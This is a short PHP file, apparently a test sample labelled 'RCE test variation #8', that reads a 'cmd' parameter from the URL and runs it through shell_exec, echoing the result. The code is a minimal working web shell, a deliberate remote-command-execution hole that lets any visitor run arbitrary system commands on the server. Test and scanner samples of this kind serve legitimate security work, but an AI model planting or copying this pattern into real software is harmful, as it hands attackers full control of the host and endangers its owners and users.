<?php
// RCE test variation #8
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>